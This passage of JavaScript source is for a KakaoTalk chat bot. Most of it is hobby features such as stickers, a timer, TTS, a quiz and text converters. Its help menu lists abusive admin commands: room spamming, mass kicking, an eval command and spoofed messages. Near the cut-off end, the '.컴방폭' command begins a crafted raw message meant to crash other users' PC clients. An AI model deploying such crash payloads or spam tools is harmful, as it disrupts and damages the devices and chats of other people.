              "https://search1.daumcdn.net/thumb/C328x328.q85/?fname=https%3A%2F%2Ft1.search.daumcdn.net%2Ftextcon%2Fstatics%2F110.png"
            );
            break;
          case 3:
            sendAny(
              chat,
              "https://search1.daumcdn.net/thumb/C328x328.q85/?fname=https%3A%2F%2Ft1.search.daumcdn.net%2Ftextcon%2Fstatics%2F111.png"
            );
            break;
          case 4:
            sendAny(
              chat,
              "https://search1.daumcdn.net/thumb/C328x328.q85/?fname=https%3A%2F%2Ft1.search.daumcdn.net%2Ftextcon%2Fstatics%2F165.png"
            );
            break;
          case 5:
            sendAny(
              chat,
              "https://search1.daumcdn.net/thumb/C328x328.q85/?fname=https%3A%2F%2Ft1.search.daumcdn.net%2Ftextcon%2Fstatics%2F113.png"
            );
            break;
          case 6:
            sendAny(
              chat,
              "https://search1.daumcdn.net/thumb/C328x328.q85/?fname=https%3A%2F%2Ft1.search.daumcdn.net%2Ftextcon%2Fstatics%2F164.png"
            );
            break;
          case 7:
            sendAny(
              chat,
              "https://search1.daumcdn.net/thumb/C328x328.q85/?fname=https%3A%2F%2Ft1.search.daumcdn.net%2Ftextcon%2Fstatics%2F115.png"
            );
            break;
          case 8:
            sendAny(
              chat,
              "https://search1.daumcdn.net/thumb/C328x328.q85/?fname=https%3A%2F%2Ft1.search.daumcdn.net%2Ftextcon%2Fstatics%2F163.png"
            );
            break;
          case 9:
            sendAny(
              chat,
              "https://search1.daumcdn.net/thumb/C328x328.q85/?fname=https%3A%2F%2Ft1.search.daumcdn.net%2Ftextcon%2Fstatics%2F117.png"
            );
            break;
          case 10:
            sendAny(
              chat,
              "https://search1.daumcdn.net/thumb/C328x328.q85/?fname=https%3A%2F%2Ft1.search.daumcdn.net%2Ftextcon%2Fstatics%2F118.png"
            );
            break;
          case 11:
            sendAny(
              chat,
              "https://search1.daumcdn.net/thumb/C328x328.q85/?fname=https%3A%2F%2Ft1.search.daumcdn.net%2Ftextcon%2Fstatics%2F119.png"
            );
            break;
          case 12:
            sendAny(
              chat,
              "https://search1.daumcdn.net/thumb/C328x328.q85/?fname=https%3A%2F%2Ft1.search.daumcdn.net%2Ftextcon%2Fstatics%2F120.png"
            );
            break;
          case 13:
            sendAny(
              chat,
              "https://search1.daumcdn.net/thumb/C328x328.q85/?fname=https%3A%2F%2Ft1.search.daumcdn.net%2Ftextcon%2Fstatics%2F121.png"
            );
            break;
          case 14:
            sendAny(
              chat,
              "https://search1.daumcdn.net/thumb/C328x328.q85/?fname=https%3A%2F%2Ft1.search.daumcdn.net%2Ftextcon%2Fstatics%2F162.png"
            );
            break;
          case 15:
            sendAny(
              chat,
              "https://search1.daumcdn.net/thumb/C328x328.q85/?fname=https%3A%2F%2Ft1.search.daumcdn.net%2Ftextcon%2Fstatics%2F123.png"
            );
            break;
          case 16:
            sendAny(
              chat,
              "https://search1.daumcdn.net/thumb/C328x328.q85/?fname=https%3A%2F%2Ft1.search.daumcdn.net%2Ftextcon%2Fstatics%2F124.png"
            );
            break;
          case 17:
            sendAny(
              chat,
              "https://search1.daumcdn.net/thumb/C328x328.q85/?fname=https%3A%2F%2Ft1.search.daumcdn.net%2Ftextcon%2Fstatics%2F125.png"
            );
            break;
          case 18:
            sendAny(
              chat,
              "https://search1.daumcdn.net/thumb/C328x328.q85/?fname=https%3A%2F%2Ft1.search.daumcdn.net%2Ftextcon%2Fstatics%2F126.png"
            );
            break;
          case 19:
            sendAny(
              chat,
              "https://search1.daumcdn.net/thumb/C328x328.q85/?fname=https%3A%2F%2Ft1.search.daumcdn.net%2Ftextcon%2Fstatics%2F127.png"
            );
            break;
          case 20:
            sendAny(
              chat,
              "https://search1.daumcdn.net/thumb/C328x328.q85/?fname=https%3A%2F%2Ft1.search.daumcdn.net%2Ftextcon%2Fstatics%2F128.png"
            );
            break;
          case 21:
            sendAny(
              chat,
              "https://search1.daumcdn.net/thumb/C328x328.q85/?fname=https%3A%2F%2Ft1.search.daumcdn.net%2Ftextcon%2Fstatics%2F129.png"
            );
            break;
          case 22:
            sendAny(
              chat,
              "https://search1.daumcdn.net/thumb/C328x328.q85/?fname=https%3A%2F%2Ft1.search.daumcdn.net%2Ftextcon%2Fstatics%2F130.png"
            );
            break;
          case 23:
            sendAny(
              chat,
              "https://search1.daumcdn.net/thumb/C328x328.q85/?fname=https%3A%2F%2Ft1.search.daumcdn.net%2Ftextcon%2Fstatics%2F131.png"
            );
            break;
          case 24:
            sendAny(
              chat,
              "https://search1.daumcdn.net/thumb/C328x328.q85/?fname=https%3A%2F%2Ft1.search.daumcdn.net%2Ftextcon%2Fstatics%2F132.png"
            );
            break;
          case 25:
            sendAny(
              chat,
              "https://search1.daumcdn.net/thumb/C328x328.q85/?fname=https%3A%2F%2Ft1.search.daumcdn.net%2Ftextcon%2Fstatics%2F133.png"
            );
            break;
          case 26:
            sendAny(
              chat,
              "https://search1.daumcdn.net/thumb/C328x328.q85/?fname=https%3A%2F%2Ft1.search.daumcdn.net%2Ftextcon%2Fstatics%2F134.png"
            );
            break;
          case 27:
            sendAny(
              chat,
              "https://search1.daumcdn.net/thumb/C328x328.q85/?fname=https%3A%2F%2Ft1.search.daumcdn.net%2Ftextcon%2Fstatics%2F135.png"
            );
            break;
          case 28:
            sendAny(
              chat,
              "https://search1.daumcdn.net/thumb/C328x328.q85/?fname=https%3A%2F%2Ft1.search.daumcdn.net%2Ftextcon%2Fstatics%2F136.png"
            );
            break;
          case 29:
            sendAny(
              chat,
              "https://search1.daumcdn.net/thumb/C328x328.q85/?fname=https%3A%2F%2Ft1.search.daumcdn.net%2Ftextcon%2Fstatics%2F137.png"
            );
            break;
          case 30:
            sendAny(
              chat,
              "https://search1.daumcdn.net/thumb/C328x328.q85/?fname=https%3A%2F%2Ft1.search.daumcdn.net%2Ftextcon%2Fstatics%2F138.png"
            );
            break;
          case 31:
            sendAny(
              chat,
              "https://search1.daumcdn.net/thumb/C328x328.q85/?fname=https%3A%2F%2Ft1.search.daumcdn.net%2Ftextcon%2Fstatics%2F139.png"
            );
            break;
          case 32:
            sendAny(
              chat,
              "https://search1.daumcdn.net/thumb/C328x328.q85/?fname=https%3A%2F%2Ft1.search.daumcdn.net%2Ftextcon%2Fstatics%2F140.png"
            );
            break;
          case 33:
            sendAny(
              chat,
              "https://search1.daumcdn.net/thumb/C328x328.q85/?fname=https%3A%2F%2Ft1.search.daumcdn.net%2Ftextcon%2Fstatics%2F141.png"
            );
            break;
          case 34:
            sendAny(
              chat,
              "https://search1.daumcdn.net/thumb/C328x328.q85/?fname=https%3A%2F%2Ft1.search.daumcdn.net%2Ftextcon%2Fstatics%2F142.png"
            );
            break;
          case 35:
            sendAny(
              chat,
              "https://search1.daumcdn.net/thumb/C328x328.q85/?fname=https%3A%2F%2Ft1.search.daumcdn.net%2Ftextcon%2Fstatics%2F143.png"
            );
            break;
          case 36:
            sendAny(
              chat,
              "https://search1.daumcdn.net/thumb/C328x328.q85/?fname=https%3A%2F%2Ft1.search.daumcdn.net%2Ftextcon%2Fstatics%2F144.png"
            );
            break;
          case 37:
            sendAny(
              chat,
              "https://search1.daumcdn.net/thumb/C328x328.q85/?fname=https%3A%2F%2Ft1.search.daumcdn.net%2Ftextcon%2Fstatics%2F145.png"
            );
            break;
          case 38:
            sendAny(
              chat,
              "https://search1.daumcdn.net/thumb/C328x328.q85/?fname=https%3A%2F%2Ft1.search.daumcdn.net%2Ftextcon%2Fstatics%2F146.png"
            );
            break;
          case 39:
            sendAny(
              chat,
              "https://search1.daumcdn.net/thumb/C328x328.q85/?fname=https%3A%2F%2Ft1.search.daumcdn.net%2Ftextcon%2Fstatics%2F147.png"
            );
            break;
          case 40:
            sendAny(
              chat,
              "https://search1.daumcdn.net/thumb/C328x328.q85/?fname=https%3A%2F%2Ft1.search.daumcdn.net%2Ftextcon%2Fstatics%2F148.png"
            );
            break;
          case 41:
            sendAny(
              chat,
              "https://search1.daumcdn.net/thumb/C328x328.q85/?fname=https%3A%2F%2Ft1.search.daumcdn.net%2Ftextcon%2Fstatics%2F149.png"
            );
            break;
          case 42:
            sendAny(
              chat,
              "https://search1.daumcdn.net/thumb/C328x328.q85/?fname=https%3A%2F%2Ft1.search.daumcdn.net%2Ftextcon%2Fstatics%2F150.png"
            );
            break;
          case 43:
            sendAny(
              chat,
              "https://search1.daumcdn.net/thumb/C328x328.q85/?fname=https%3A%2F%2Ft1.search.daumcdn.net%2Ftextcon%2Fstatics%2F151.png"
            );
            break;
          case 44:
            sendAny(
              chat,
              "https://search1.daumcdn.net/thumb/C328x328.q85/?fname=https%3A%2F%2Ft1.search.daumcdn.net%2Ftextcon%2Fstatics%2F152.png"
            );
            break;
          case 45:
            sendAny(
              chat,
              "https://search1.daumcdn.net/thumb/C328x328.q85/?fname=https%3A%2F%2Ft1.search.daumcdn.net%2Ftextcon%2Fstatics%2F153.png"
            );
            break;
          case 46:
            sendAny(
              chat,
              "https://search1.daumcdn.net/thumb/C328x328.q85/?fname=https%3A%2F%2Ft1.search.daumcdn.net%2Ftextcon%2Fstatics%2F154.png"
            );
            break;
          case 47:
            sendAny(
              chat,
              "https://search1.daumcdn.net/thumb/C328x328.q85/?fname=https%3A%2F%2Ft1.search.daumcdn.net%2Ftextcon%2Fstatics%2F155.png"
            );
            break;
          case 48:
            sendAny(
              chat,
              "https://search1.daumcdn.net/thumb/C328x328.q85/?fname=https%3A%2F%2Ft1.search.daumcdn.net%2Ftextcon%2Fstatics%2F156.png"
            );
            break;
          case 49:
            sendAny(
              chat,
              "https://search1.daumcdn.net/thumb/C328x328.q85/?fname=https%3A%2F%2Ft1.search.daumcdn.net%2Ftextcon%2Fstatics%2F157.png"
            );
            break;
          case 50:
            sendAny(
              chat,
              "https://search1.daumcdn.net/thumb/C328x328.q85/?fname=https%3A%2F%2Ft1.search.daumcdn.net%2Ftextcon%2Fstatics%2F158.png"
            );
            break;
          case 51:
            sendAny(
              chat,
              "https://search1.daumcdn.net/thumb/C328x328.q85/?fname=https%3A%2F%2Ft1.search.daumcdn.net%2Ftextcon%2Fstatics%2F159.png"
            );
            break;
          case 52:
            sendAny(
              chat,
              "https://search1.daumcdn.net/thumb/C328x328.q85/?fname=https%3A%2F%2Ft1.search.daumcdn.net%2Ftextcon%2Fstatics%2F160.png"
            );
            break;
          case 53:
            sendAny(
              chat,
              "https://search1.daumcdn.net/thumb/C328x328.q85/?fname=https%3A%2F%2Ft1.search.daumcdn.net%2Ftextcon%2Fstatics%2F161.png"
            );
            break;
        }
      }
      function sendAny(chat, link) {
        client.chatManager.sendRaw(chat.channel, 23, "Search", {
          L: link,
          Q: "아무말",
          V: "image",
          R: [
            {
              D: "아무말",
              L: link,
              I: link,
              W: 800,
              H: 800,
            },
          ],
        });
      }
      if (Text.indexOf(".타이머 ") == 0) {
        var num = Number(Text.split(" ")[1].replace(/[^0-9]/g, ""));
        function sleep(ms) {
          return new Promise((resolve) => setTimeout(resolve, ms));
        }

        (async function () {
          chat.replyText(
            "타이머 시작!\n" + String(num) + "초 뒤에 타이머가 종료됩니다!"
          );
          await sleep(num * 1000);
          chat.replyText(String(num) + "초가 끝났습니다.");
        })();
      }
      if (chat.Text == ".도움말") {
        var allsee = "\u200b".repeat(500);
        chat.replyText(
          "[ ! ] LIMGEHBOT by 임지혁" +
            allsee_1 +
            "\n•─────⋅기본⋅─────•\n- 공식 사이트 : limgeh324.wixsite.com/limgeh-bot\n- 들낙 방지\n- 광고 자동 가리기\n- 입장/퇴장/강퇴 감지\n- 도배 감지(추가 예정)\n- 패드립 자동 강퇴\n•─────⋅  𝓯𝓻𝓮𝓮  ⋅─────•\n.긴단어 (단어)\n.끝말잇기\nㄴ .난이도 (난이도) - 난이도 설정\nㄴ .시작 - 끝말잇기 시작\n.ㅍ (챗) - 자동 채팅 ai\n.자동번역 (언어) (문자)\nㄴ .수동번역 (언어) (언어2) (문자)\n.파싱 (링크) - html 가져옴\n.이진수 (문자) - 이진수로 변환\nㄴ .문자화 (이진수) - 문자로 변환\nㄴ .십진수 (이진수) - 십진수로 변환\n.영단어 [막힘] - 오늘의 영단어 출력\n.암호화 (문자열) - 문자열 암호화\nㄴ .복호화 (암호) - 암호 복호화\n.가르치기 (갸르칠 말)//(반응할 말)\n.가르치기삭제 (가르칠 말)\n.출첵 - 출석체크\nㄴ .출석초기화 - 리스트 초기화\nㄴ .출석리스트 - 출석 확인\n.구글 (검색어) - 구글 검색\n.한국코로나 - 한국 코로나 확인\nㄴ .코로나 (지역) - 지역 한정 확인\n.쪽지 (할 말)/ @멘션\n.초성 (단어) - 초성 반환\n.업데이트 - 업데이트 된 기능 출력\n.맵 (위치) - 구글 맵 결과\n테스트용 - 봇 작동 유무 확인용\n.업다운 - 업다운 게임 시작\n.event [막힘] - 채팅 이벤트\n.아무말 - 아무 말이나 출력\n.타이머 (초) - 타이머 설정\n.도움말 - 명령어 목록\n.tts (언어) - tts 파일 다운\n.tts2 - 파일 보냄\n.언어코드 - 구글 번역기 언어 코드\n.챗타입 - node kakao 채팅 타입\n.유효숫자 (숫자) - 유효숫자 출력\n.ja (문자) - 한글을 히라가나로 변환\n.투표 [개발중]\n.카카오맵 - 기본값: 서울역\n.갠톡 - 개발자 갠톡 링크\n.후원 - 나한테 후원 냠냠\n.블랙리스트 확인 - 블랙리스트 목록\n.추천음악 - 내가 좋아하는거\n.약수 (숫자) - 해당 숫자의 약수 구함\n.보톡 걸기 [막힘]\n.초성퀴즈 - 초성퀴즈 시작\nㄴ .힌트 - 힌트 출력\nㄴ .정답 (답) - 정답 확인\n.로그 - 소스와 비슷\n.인증 - 어드민 인증\n•─────⋅𝓪𝓭𝓶𝓲𝓷⋅─────•\n.방제 (방제) - 방제목 바 /옾챗불가\n.닉넴 (닉) [개발중]\n.2tv (링크)\n.tv (링크) / 옾챗 불가\nㄴ .offtv\n.컴방폭 - 컴터 폭☆8\n.kakaotv - 카카오tv 검색\n.검색 (방제) - 오픈채팅 방 검색\n.투명멘션 - 투명으로 모두 멘션 함\n.채팅서버 - 채팅서버 오픈\n.공지 (글) / 부방, 방장만 가능\n.반복 - 챗타입 확인용\n.킬링벌스 - 랜덤 킬링벌스\n.라이브톡 [막힘]\n.나가기 - 방 나감\n.이미지가리기on [개발중]\nㄴ .이미지가리기off [개발중]\n.입퇴장기록 - 입퇴장 리스트\n.계산기조작 (계산식) (결과)\n.갠톡들 [개발중]\n.소스 (챗타입) - 소스코드 뽑음\n.읽은사람 - 읽은사람 출력\n.외치기 (채팅) / 부방, 방장만 가능\n.끄기 - 봇이 꺼짐\n.프로필 - 내 옛날 프로필\n.날씨조작 (위치) (온도)\n.시간표 (학교) (학년) (반) (요일)\n.학교정보 (위치) (종류) (학교)\n.프로필조작 (유저아이디) (이름)\n.연락처조작 (이름)\n.강퇴 (멘션)\n.유저타입\n.id (멘션)\n.채팅금지 (멘션) - 아가리 봉인\nㄴ .채금해제 (멘션)\n.감지 (멘션) - 읽는지 확인\n.모두강퇴 - 방장 뒷목\n.도배 - 방장 뒷목2\nㄴ .도배중지\n.봇 (멘션) / 방장만\n.방장넘기기 / 방장만\n.큐알 (내용)\n.uuid\n.어드민 (멘션)\n.2id\n.강퇴해제\n.어드민리스트 - 어드민 목록\n.2임티 (임티 코드) (순서)\n.연컴\n.연컴중지\n.부방 (멘션) / 방장만\n.초기화 (멘션) / 방장만\n.임티 (임티 코드) (순서) (크기)\n.비상모드\n.가리기\n.블랙리스트\nㄴ .블랙리스트 초기화\n.모두멘션 - 모든 사람 멘션\n.eval (코드) - 인터프리터 방식\n.한강물 - 뒤지면 안되요\n.캡쳐 (사이트)\n.2강퇴\n.성x랭킹 [개발중]\n.정지 - 정지 메세지\n.섭끄기 - 서버 끔\n.파일 (html) - html 파일로 변환\n.서버 - 다운한 html로 서버 엶\n.mp (링크) - 링크의 음원 다운\nㄴ .mp2 - 파일로 보내기\nㄴ .mp3 - 음성으로 보내기\n.자동엔터 - 자동 \\n\n.yt (검색어) - 유튜브 음원 다운\nㄴ .ysend - 보내기\n.vid (링크)\nㄴ .vid2 - 파일로 보내기\nㄴ .vid3 - 비디오로 보내기\n.답장 (채팅)\n/답장/(반응할말)|(할말)/@멘션\n.유저정보 (멘션)\n.방생성 (방제)"
        );
      }
      //AI 자동학습
      if (atst) {
        stu.push(Text);
      }
      if (Text == ".tts2") {
        chat.replyText("[ ! ] 보내는중..");
        chat.channel.sendMedia({
          type: node_kakao_1.ChatType.Audio,
          name: file,
          data: fs.readFileSync("translate_tts.mp3"),
          ext: "mp3",
        });
      }
      if (Text == ".언어코드") {
        chat.replyText(
          "[ ! ] 구글 번역기 및 tts 언어 코드를 출력합니다\n" +
            allsee_1 +
            "아랍어	ar\n불가리아어	bg\n카탈로니아어	ca\n중국어 번체(대만)	zh-TW\n중국어 간체	zh-CN\n크로아티아어	hr\n체코어	cs\n덴마크어	da\n네덜란드어	nl\n영어	en\n영어(영국)	en-GB\n필리핀어	fil\n핀란드어	fi\n프랑스어	fr\n독일어	de\n그리스어	el\n히브리어	iw\n힌디어	hi\n헝가리어	hu\n인도네시아어	id\n이탈리아어	it\n일본어	ja\n한국어	ko\n라트비아어	lv\n리투아니아어	lt\n노르웨이어	no\n폴란드어	pl\n포르투갈어(브라질)	pt-BR\n포르투갈어(포르투갈)	pt-PT\n루마니아어	ro\n러시아어	ru\n세르비아어	sr\n슬로바키아어	sk\n슬로베니아어	sl\n스페인어	es\n스웨덴어	sv\n태국어	th\n터키어	tr\n우크라이나어	uk\n베트남어	vi"
        );
      }
      if (Text == ".챗타입") {
        chat.replyText(
          "[ ! ] v3버전 챗타입을 출력합니다" +
            allsee_1 +
            "Unknown = -1,\nFeed = 0,\nText = 1,\nPhoto = 2,\nVideo = 3,\nContact = 4,\nAudio = 5,\nDitemEmoticon = 6,\nDitemGift = 7,\nDitemImg = 8,\nKakaoLinkV1 = 9,\nAvatar = 11,\nSticker = 12,\nSchedule = 13,\nVote = 14,\nLottery = 15,\nMap = 16,\nProfile = 17,\nFile = 18,\nStickerAni = 20,\nNudge = 21,\nActioncon = 22,\nSearch = 23,\nPost = 24,\nStickerGif = 25,\nReply = 26,\nMultiPhoto = 27,\nVoip = 51,\nLiveTalk = 52,\nCustom = 71,\nAlim = 72,\nPlusFriend = 81,\nPlusEvent = 82,\nPlusFriendViral = 83,\nOpenVote = 97,\nOpenPost = 98,"
        );
      }
      if (Text.indexOf(".tts") == 0) {
        var what = Text.split(" ");
        var sent = Text.substring(8);
        var langu = what[1];
        if (
          langu == "zh-CN" ||
          langu == "zh-TW" ||
          langu == "en-GB" ||
          langu == "pt-BR" ||
          langu == "pt-PT"
        ) {
          sent = Text.substring(11);
        }
        const url = googleTTS.getAudioUrl(sent, {
          lang: langu,
          slow: false,
          host: "https://translate.google.com",
        });
        try {
          (async () => {
            await download(url, "C:/v3_release");
          })();
          chat.replyText("[ ! ] 다운로드 완료!");
        } catch (err) {
          chat.replyText("[ ! ] 오류가 발생했습니다!ㅜ" + err);
        }
      }
      function Significant_figures(n) {
        try {
          for (i = 0; i < n.length; i++) {
            //숫자나 .이 아닌 문자가 있을 때
            if (n[i] != "." && (n[i] < "0" || n[i] > "9")) throw "Wrong Number";
          }
          n = n.split(".");
          var z_cnt = 0,
            cnt = 0,
            p;

          if (n.length > 2) throw "Wrong Number"; //소숫점이 여러개 있을 때
          if (n[0].length == 0) throw "Wrong Number"; //소숫점 앞에 아무것도 없을 때

          for (i = 0; i < n[0].length; i++) {
            //정수부
            if (
              "1" <= n[0][n[0].length - 1 - i] &&
              n[0][n[0].length - 1 - i] <= "9"
            ) {
              z_cnt += i; //0이 아닌 숫자가 나오기 전까지 0 갯수
              cnt += n[0].length - i; //일반 숫자 갯수
              break;
            }
          }
          if (n.length == 2) {
            //소수부
            cnt += z_cnt;
            cnt += n[1].length;
            p = -n[1].length;
          } else p = z_cnt;
          return "[ ! ] 유효숫자 : " + cnt + "개(10^" + p + " 자리)";
        } catch (e) {
          if (e == "Wrong Number") return "[ ! ] 숫자가 올바르지 않습니다.";
          else return e;
        }
      }
      if (Text.indexOf(".유효숫자") == 0) {
        var a = Text.substring(6);
        chat.replyText(String(Significant_figures(a)));
      }
      if (Text.indexOf(".ja") == 0) {
        var msg = Text.replace(Text.split(" ")[0] + " ", "");

        //원래 を는 wo라고 발음표기하고 o소리가 납니다만.. お와 겹치기에 옹이라고 적어뒀습니다.
        //그리고 ぢゃ, ぢゅ, ぢょ는 jya, jyu, jyo라고 발음표기가 됩니다만.. 이는 じゃ, じゅ, じょ와 발음표기가 같기에 일본어 타자상 dya, dyu, dyo로 적어뒀습니다.
        var japanese = [
          "あ",
          "い",
          "う",
          "え",
          "お",
          "か",
          "き",
          "く",
          "け",
          "こ",
          "さ",
          "し",
          "す",
          "せ",
          "そ",
          "た",
          "ち",
          "つ",
          "て",
          "と",
          "な",
          "に",
          "ぬ",
          "ね",
          "の",
          "は",
          "ひ",
          "ふ",
          "へ",
          "ほ",
          "ま",
          "み",
          "む",
          "め",
          "も",
          "や",
          "ゆ",
          "よ",
          "ら",
          "り",
          "る",
          "れ",
          "ろ",
          "わ",
          "を",
          "ん",
          "きゃ",
          "きゅ",
          "きょ",
          "しゃ",
          "しゅ",
          "しょ",
          "ちゃ",
          "ちゅ",
          "ちょ",
          "にゃ",
          "にゅ",
          "にょ",
          "ひゃ",
          "ひゅ",
          "ひょ",
          "みゃ",
          "みゅ",
          "みょ",
          "りゃ",
          "りゅ",
          "りょ",
          "が",
          "ぎ",
          "ぐ",
          "げ",
          "ご",
          "ざ",
          "じ",
          "ず",
          "ぜ",
          "ぞ",
          "だ",
          "ぢ",
          "づ",
          "で",
          "ど",
          "ば",
          "び",
          "ぶ",
          "べ",
          "ぼ",
          "ぱ",
          "ぴ",
          "ぷ",
          "ぺ",
          "ぽ",
          "ぎゃ",
          "ぎゅ",
          "ぎょ",
          "じゃ",
          "じゅ",
          "じょ",
          "ぢゃ",
          "ぢゅ",
          "ぢょ",
          "びょ",
          "びゅ",
          "びょ",
          "ぴゃ",
          "ぴゅ",
          "ぴょ",
          ",",
          ".",
          "작따1",
          "작따2",
          "큰따1",
          "큰따2",
          "!",
          "?",
          "1",
          "2",
          "3",
          "4",
          "5",
          "6",
          "7",
          "8",
          "9",
        ];

        var korean = [
          "아",
          "이",
          "우",
          "에",
          "오",
          "카",
          "키",
          "쿠",
          "케",
          "코",
          "사",
          "시",
          "스",
          "세",
          "소",
          "타",
          "치",
          "츠",
          "테",
          "토",
          "나",
          "니",
          "누",
          "네",
          "노",
          "하",
          "히",
          "후",
          "헤",
          "호",
          "마",
          "미",
          "무",
          "메",
          "모",
          "야",
          "유",
          "요",
          "라",
          "리",
          "루",
          "레",
          "로",
          "와",
          "옹",
          "응",
          "캬",
          "큐",
          "쿄",
          "샤",
          "슈",
          "쇼",
          "챠",
          "츄",
          "쵸",
          "냐",
          "뉴",
          "뇨",
          "햐",
          "휴",
          "효",
          "먀",
          "뮤",
          "묘",
          "랴",
          "류",
          "료",
          "가",
          "기",
          "구",
          "게",
          "고",
          "자",
          "지",
          "즈",
          "제",
          "조",
          "다",
          "지",
          "쯔",
          "데",
          "도",
          "바",
          "비",
          "부",
          "베",
          "보",
          "파",
          "피",
          "푸",
          "페",
          "포",
          "갸",
          "규",
          "교",
          "쟈",
          "쥬",
          "죠",
          "댜",
          "듀",
          "됴",
          "뱌",
          "뷰",
          "뵤",
          "퍄",
          "퓨",
          "표",
          "、",
          "。",
          "「",
          "」",
          "『",
          "』",
          "!",
          "?",
          "1",
          "2",
          "3",
          "4",
          "5",
          "6",
          "7",
          "8",
          "9",
        ];

        var result = "";
        for (var i = 0; i < msg.length; i++) {
          if (msg[i] != " ") {
            if (msg[i] == "ㄴ" || msg[i] == "ㅇ") {
              result = result + "ん";
            } else {
              result = result + japanese[korean.indexOf(msg[i])];
            }
          } else {
            result = result + " ";
          }
        }

        chat.replyText(result);
      }

      if (chat.Text == ".투표") {
        client.chatManager.sendRaw(chat.channel, 97, "voting", {
          Q: "테스트용 투표",
        });
      }
      if (chat.Text == ".카카오맵") {
        client.chatManager.sendRaw(chat.channel, 16, "map", {
          lat: 37.5536386,
          lng: 126.97137,
          a: "서울역(기본값)",
        });
      }
      if (chat.Text == ".갠톡") {
        client.chatManager.sendRaw(chat.channel, 23, "Search", {
          L: "https://open.kakao.com/o/sSZueVjd",
          Q: "개발자 갠톡",
          V: "image",
          R: [
            {
              D: "개발자 갠톡",
              L: "https://open.kakao.com/o/sSZueVjd",
              I: "https://ifh.cc/g/YfZgHn.jpg",
              W: 800,
              H: 800,
            },
          ],
        });
      }
      if (chat.Text == ".후원") {
        client.chatManager.sendRaw(chat.channel, 23, "Search", {
          L: "kakaotalk://kakaopay/money/receive?id=limgeh324",
          Q: "개발자 후원",
          V: "image",
          R: [
            {
              D: "개발자 후원",
              L: "kakaotalk://kakaopay/money/receive?id=limgeh324",
              I: "https://ifh.cc/g/YfZgHn.jpg",
              W: 800,
              H: 800,
            },
          ],
        });
      }
      if (Text == ".블랙리스트 확인") {
        chat.replyText(String(blacklist));
      }
      if (chat.Text == ".추천음악") {
        client.chatManager.sendRaw(chat.channel, 23, "Search", {
          L: "kakaotalk://melon?action=playmusic&type=song&mediaid=33478321&menuid=1000000932",
          Q: "D.Ark(디아크) - GENIUS (Feat. 창모)",
          V: "image",
          R: [
            {
              D: "멜론 재생",
              L: "kakaotalk://melon?action=playmusic&type=song&mediaid=33478321&menuid=1000000932",
              I: "https://i.pinimg.com/736x/3f/fb/77/3ffb7721e10a7a948505af7687faf8d1.jpg",
              W: 800,
              H: 800,
            },
          ],
        });
      }
      if (Text == ".보톡 걸기") {
        client.chatManager.sendRaw(chat.channel, 52, "voicetalk", {
          type: "cancel",
          csIP: "",
          csIP6: "",
          csPort: 9000,
          callId: "",
          duration: 0,
        });
      }

      if (Text == ".초성퀴즈") {
        var i = Math.floor(Math.random() * 3);
        what_1 = i;
        chat.replyText(
          "[ ! ] 문제: " + cho_hangul(ans[i]) + "\n힌트는 .힌트 정답은 .정답"
        );
      }
      if (Text == ".힌트") {
        chat.replyText("[ ! ] 힌트: " + hint[what_1]);
      }
      if (Text.startsWith(".정답")) {
        var ans_1 = Text.substr(4);
        if (ans_1 == ans[what_1]) {
          chat.replyText("[ ! ] 정답!");
        } else {
          chat.replyText("[ ! ] 오답");
        }
      }
      function yacksu1(yacksu1) {
        var updown = 2;
        var long_list = [1];
        while (1 == 1) {
          if (yacksu1 == 0) {
            chat.replyText("[ ! ] 0은 계산할 수 없습니다.");
            break;
          }
          if (yacksu1.length > 8) {
            chat.replyText(
              "[ ! ] " +
                yacksu1 +
                " 은(는) 너무 큰 수 입니다.\n범위: 1 ~ 99999999"
            );
            break;
          }
          if (yacksu1 % updown == 0) {
            updown = 2;
            var time_number = 3333333; //테스트 할때는 1초당 3333333번 계산했는데 구동환경에 따라 다르니 참고
            var time = Math.round(yacksu1 / time_number);
            chat.replyText("[ ! ] " + "예상 소요시간: " + time + "초");
            while (yacksu1 != updown - 1) {
              if (yacksu1 % updown == 0) {
                long_list.push(updown);
              }
              updown++;
            }
            chat.replyText(
              "[ ! ] " + yacksu1 + " 의 약수입니다.\n" + long_list
            );
            break;
          } else {
            updown++;
            if (updown - 1 >= Math.sqrt(yacksu1)) {
              chat.replyText(
                "[ ! ] " + yacksu1 + " 의 약수입니다.\n1," + yacksu1
              );
              break;
            }
          }
        }
        //by 탄소
      }
      if (allhide && banroom.includes(chat.Channel.Id)) {
        setTimeout(() => {
          openChannel.hideChat(chat);
        }, 140);
      }
      if (Text.startsWith(".약수")) {
        var a = Text.substring(4);
        yacksu1(a);
      }
      console.log(
        chat.Sender.id +
          " " +
          userInfo.Nickname +
          ":" +
          chat.Text +
          "\n" +
          chat.attachmentList.map((v) => v.$).join("\n")
      );
      blankFunc(chat);
      if (Text == ".인증") {
        if (!isAdmin(chat.Sender.Id)) {
          cartifiInfo = {
            waiting: true,
            key: crypto_1.default.randomBytes(3).toString("base64"),
          };
          console.log("인증: ", `${cartifiInfo.key}를 채팅창에 입력해주세요.`);
        } else {
          chat.replyText("이미 관리자에 등록되있습니다.");
        }
      }
      if (cartifiInfo.waiting && Text == cartifiInfo.key) {
        adminList.push(userId);
        cartifiInfo.waiting = false;
        chat.replyText("인증되셨습니다.");
      }
      if (noChatUsers.includes(userId)) {
        setTimeout(() => {
          openChannel.hideChat(chat);
        }, 140);
      }
      if (!isAdmin(userId)) return;
      if (Text == ".모두가리기on") {
        allhide = true;
        banroom.push(chat.Channel.Id);
        chat.replyText("[ ! ] 모든 채팅을 가립니다");
      }
      if (Text == ".모두가리기off") {
        allhide = false;
        chat.replyText("[ ! ] 모두 가리기가 꺼졌습니다");
        const idx = banroom.indexOf(chat.Channel.Id);
        if (idx > -1) banroom.splice(idx, 1);
      }
      if (Text.indexOf(".방제") == 0) {
        var ti = Text.substring(4);
        chat.replyText("[ ! ] 방제를 " + ti + "로 변경합니다!");
        chat.Channel.setTitleMeta(ti);
      }
      if (Text.indexOf(".닉넴") == 0) {
        var nick = Text.substring(4);
        client.ChannelManager.changeProfile(chat.channel, { nickname: nick });
      }
      if (Text.indexOf(".2tv") == 0) {
        var content = Text.substring(4);
        chat.Channel.setTvMeta({ url: content });
      }
      if (Text == ".컴방폭") {
        client.chatManager.sendRaw(chat.channel, 23, "Search", {
          R: [
            {
              L: "https://search3.kakaocdn.net/argon/600x0_65_wr/CzHtKJ3bE3m",
              MA: [],
              D: "PC 펑",
              PL: "펑",
              TM: "튕",
              SU: [
                {
                  TE: "44",
                  T: ".",
                  IC: "44",
                  DE: "",
                },
              ],
            },
          ],
          V: "weather",
          callingPkg: "",
